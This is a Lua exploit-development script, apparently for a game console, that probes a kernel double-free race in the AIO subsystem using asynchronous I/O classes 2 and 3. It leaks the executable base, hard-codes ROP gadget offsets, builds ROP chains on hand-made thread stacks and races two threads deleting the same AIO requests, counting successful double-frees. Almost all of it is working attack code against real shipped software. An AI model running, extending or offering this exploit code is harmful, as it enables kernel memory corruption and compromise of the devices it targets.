-- CRASH_CLASS: MODERATE
-- PROBE 69s: AIO class 2 and class 3 — submit + delete + race
--
-- Context: ALL 30+ AIO probes use class=1. Class 2 and 3 are completely
-- untested for the double-free race. Different classes may:
--   - Use different zone allocators (different object sizes)
--   - Have different locking (weaker → easier race)
--   - Process through different code paths in 662 delete
--
-- This probe tests:
--   A) Can class 2 submit + poll + delete work at all?
--   B) Can class 3 submit + poll + delete work at all?
--   C) Double-free race with class 2
--   D) Double-free race with class 3
--   E) Cross-class race: submit class=1, delete with class=2 children

print("=== PROBE 69s: AIO CLASS 2/3 RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore signals
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("FATAL"); return end

-- AIO request struct for a given class
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

local function submit_one_class(cls)
    local reqs = memory.alloc(0x30)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    wq(N(reqs) + 0x10, uint64(N(data_buf)))
    wq(N(reqs) + 0x18, uint64(N(result_buf)))
    wd(N(reqs) + 0x20, fd_zero)
    wd(N(reqs) + 0x24, 0)
    local id_buf = memory.alloc(8)
    wd(N(id_buf), 0)
    local ret = -999
    pcall(function()
        ret = sgn(mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(cls), uint64(N(id_buf))))
    end)
    return rd(N(id_buf)) or 0, ret
end

local function poll_one(id)
    local pb = memory.alloc(8); local sb = memory.alloc(8)
    wd(N(pb), id); wd(N(sb), 0)
    local ret = -999
    pcall(function() ret = sgn(mk(664)(uint64(N(pb)), uint64(1), uint64(N(sb)))) end)
    local st = rd(N(sb)) or 0
    return ret, st
end

local function delete_one(id)
    local db = memory.alloc(8); local sb = memory.alloc(8)
    wd(N(db), id); wd(N(sb), 0xDD)
    local ret = -999
    pcall(function() ret = sgn(mk(662)(uint64(N(db)), uint64(1), uint64(N(sb)))) end)
    local st = rd(N(sb)) or 0xDD
    return ret, st
end

-- ============================================================
-- [A] CLASS 2 FUNCTIONAL TEST
-- ============================================================
print("")
print("[A] Class 2 functional test")

do
    local id, sub_ret = submit_one_class(2)
    print(string.format("  submit class=2: id=0x%X ret=%d", id, sub_ret))

    if id ~= 0 then
        local poll_ret, poll_st = poll_one(id)
        print(string.format("  poll: ret=%d st=0x%X", poll_ret, poll_st))

        local del_ret, del_st = delete_one(id)
        print(string.format("  delete: ret=%d st=0x%X", del_ret, del_st))
    else
        print("  class 2 submit failed — may not be supported")
    end
end

if not alive() then print("DEAD"); return end

-- ============================================================
-- [B] CLASS 3 FUNCTIONAL TEST
-- ============================================================
print("")
print("[B] Class 3 functional test")

do
    local id, sub_ret = submit_one_class(3)
    print(string.format("  submit class=3: id=0x%X ret=%d", id, sub_ret))

    if id ~= 0 then
        local poll_ret, poll_st = poll_one(id)
        print(string.format("  poll: ret=%d st=0x%X", poll_ret, poll_st))

        local del_ret, del_st = delete_one(id)
        print(string.format("  delete: ret=%d st=0x%X", del_ret, del_st))
    else
        print("  class 3 submit failed — may not be supported")
    end
end

if not alive() then print("DEAD"); return end

-- ============================================================
-- [C] CLASS 2 DOUBLE-FREE RACE (if class 2 works)
-- ============================================================
print("")
print("[C] Class 2 double-free race")

-- Test if class 2 works by doing a quick submit
local c2_works = false
do
    local tid, tr = submit_one_class(2)
    if tid ~= 0 then
        poll_one(tid)
        delete_one(tid)
        c2_works = true
    end
end

if c2_works and alive() then
    local fake_tcb = memory.alloc(0x1000)
    for i = 0, 0xFF8, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
    local tcb_ptr = memory.alloc(8); wq(N(tcb_ptr), uint64(N(fake_tcb)))

    local BATCH = 8
    local ITERS = 15
    local total_doubles = 0

    for iter = 1, ITERS do
        if not alive() then break end

        -- Submit BATCH class=2 requests + poll
        local ids = {}
        for i = 1, BATCH do
            local id = submit_one_class(2)
            if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
        end
        if #ids < BATCH then print("  class2 submit short"); break end

        local del_ids = memory.alloc(4 * BATCH + 0x10)
        local states_A = memory.alloc(4 * BATCH + 0x10)
        local states_B = memory.alloc(4 * BATCH + 0x10)
        for i = 0, BATCH - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAA)
            wd(N(states_B) + i * 4, 0xBB)
        end

        local marker_A = memory.alloc(8); wq(N(marker_A), uint64(0))
        local marker_B = memory.alloc(8); wq(N(marker_B), uint64(0))
        local tmp_rd = memory.alloc(8)
        local wbyte = memory.alloc(8); wd(N(wbyte), 0x42)

        local gate_a_r, gate_a_w = (function()
            local sp = memory.alloc(16); wd(N(sp), 0xFFFFFFFF); wd(N(sp)+4, 0xFFFFFFFF)
            pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
            return rd(N(sp)) or -1, rd(N(sp)+4) or -1
        end)()
        local gate_b_r, gate_b_w = (function()
            local sp = memory.alloc(16); wd(N(sp), 0xFFFFFFFF); wd(N(sp)+4, 0xFFFFFFFF)
            pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
            return rd(N(sp)) or -1, rd(N(sp)+4) or -1
        end)()

        if gate_a_r < 0 or gate_b_r < 0 then print("  gate fail"); break end

        -- Build child A
        local stk_A = memory.alloc(0x4000)
        do
            local sb = N(stk_A); for i = 0, 0x3FFC, 4 do wd(sb+i, 0) end
            local sp = ((sb + 0x4000) - ((sb + 0x4000) % 16)) - 8
            local o = 0; local function p(v) wq(sp+o, v); o=o+8 end
            p(g_pop_rax); p(uint64(165)); p(g_pop_rdi); p(uint64(129))
            p(g_pop_rsi); p(uint64(N(tcb_ptr))); p(stub)
            p(g_pop_rax); p(uint64(0xAA)); p(g_pop_rdi); p(uint64(N(marker_A))); p(g_mov_m_rax)
            p(g_pop_rax); p(uint64(3)); p(g_pop_rdi); p(uint64(gate_a_r))
            p(g_pop_rsi); p(uint64(N(tmp_rd))); p(g_pop_rdx); p(uint64(1)); p(stub)
            p(g_pop_rdi); p(uint64(N(del_ids))); p(g_pop_rsi); p(uint64(BATCH))
            p(g_pop_rdx); p(uint64(N(states_A))); p(g_pop_rax); p(uint64(662)); p(stub)
            p(g_pop_rdi); p(uint64(0)); p(g_pop_rax); p(uint64(431)); p(stub)
        end

        -- Build child B
        local stk_B = memory.alloc(0x4000)
        do
            local sb = N(stk_B); for i = 0, 0x3FFC, 4 do wd(sb+i, 0) end
            local sp = ((sb + 0x4000) - ((sb + 0x4000) % 16)) - 8
            local o = 0; local function p(v) wq(sp+o, v); o=o+8 end
            p(g_pop_rax); p(uint64(165)); p(g_pop_rdi); p(uint64(129))
            p(g_pop_rsi); p(uint64(N(tcb_ptr))); p(stub)
            p(g_pop_rax); p(uint64(0xBB)); p(g_pop_rdi); p(uint64(N(marker_B))); p(g_mov_m_rax)
            p(g_pop_rax); p(uint64(3)); p(g_pop_rdi); p(uint64(gate_b_r))
            p(g_pop_rsi); p(uint64(N(tmp_rd))); p(g_pop_rdx); p(uint64(1)); p(stub)
            p(g_pop_rdi); p(uint64(N(del_ids))); p(g_pop_rsi); p(uint64(BATCH))
            p(g_pop_rdx); p(uint64(N(states_B))); p(g_pop_rax); p(uint64(662)); p(stub)
            p(g_pop_rdi); p(uint64(0)); p(g_pop_rax); p(uint64(431)); p(stub)
        end

        -- Spawn + gate
        local function sp_child(stk, sz)
            local pa = memory.alloc(0x40)
            for i = 0, 0x3C, 4 do wd(N(pa)+i, 0) end
            wq(N(pa), g_bare_ret); wq(N(pa)+0x10, uint64(N(stk))); wq(N(pa)+0x18, uint64(sz))
            pcall(function() mk(455)(pa, uint64(0x38)) end)
        end

        sp_child(stk_A, 0x4000); sp_child(stk_B, 0x4000)

        local ra, rb = false, false
        for w = 1, 300000 do
            if not ra then local v = rq(N(marker_A)); if v and N(v) ~= 0 then ra = true end end
            if not rb then local v = rq(N(marker_B)); if v and N(v) ~= 0 then rb = true end end
            if ra and rb then break end
        end
        if not (ra and rb) then break end

        for d = 1, 200 do end
        pcall(function() mk(4)(uint64(gate_a_w), uint64(N(wbyte)), uint64(1)) end)
        pcall(function() mk(4)(uint64(gate_b_w), uint64(N(wbyte)), uint64(1)) end)
        for w = 1, 100000 do end

        local doubles = 0
        for i = 0, BATCH - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAA
            local sB = rd(N(states_B) + i * 4) or 0xBB
            if sA == 0 and sB == 0 then doubles = doubles + 1 end
        end
        total_doubles = total_doubles + doubles
        if doubles > 0 then
            print(string.format("  iter %2d: %d doubles", iter, doubles))
        end
    end
    print(string.format("  CLASS 2 TOTAL: %d doubles in %d iters", total_doubles, ITERS))
else
    print("  class 2 not supported, skipping race")
end

if not alive() then print("DEAD"); return end

-- ============================================================
-- [D] CLASS 3 DOUBLE-FREE RACE (if class 3 works)
-- ============================================================
print("")
print("[D] Class 3 double-free race")

local c3_works = false
do
    local tid, tr = submit_one_class(3)
    if tid ~= 0 then
        poll_one(tid)
        delete_one(tid)
        c3_works = true
    end
end

if c3_works and alive() then
    print("  class 3 works — race test (same pattern as class 2)")
    -- Quick 5-iter race test
    local total3 = 0
    for iter = 1, 5 do
        if not alive() then break end
        local ids3 = {}
        for i = 1, 8 do
            local id = submit_one_class(3)
            if id ~= 0 then poll_one(id); ids3[#ids3 + 1] = id end
        end
        if #ids3 < 8 then break end

        local d3 = memory.alloc(40); local sA3 = memory.alloc(40); local sB3 = memory.alloc(40)
        for i = 0, 7 do wd(N(d3)+i*4, ids3[i+1]); wd(N(sA3)+i*4, 0xAA); wd(N(sB3)+i*4, 0xBB) end

        -- Main-thread sequential delete race (simpler, still tests the path)
        pcall(function() mk(662)(uint64(N(d3)), uint64(8), uint64(N(sA3))) end)
        pcall(function() mk(662)(uint64(N(d3)), uint64(8), uint64(N(sB3))) end)

        local d = 0
        for i = 0, 7 do
            if (rd(N(sA3)+i*4) or 0xAA) == 0 and (rd(N(sB3)+i*4) or 0xBB) == 0 then d = d + 1 end
        end
        total3 = total3 + d
    end
    print(string.format("  CLASS 3 sequential: %d doubles in 5 iters", total3))
else
    print("  class 3 not supported")
end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print(string.format("SUMMARY: class2=%s class3=%s",
    c2_works and "WORKS" or "DEAD",
    c3_works and "WORKS" or "DEAD"))
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 69s COMPLETE ===")
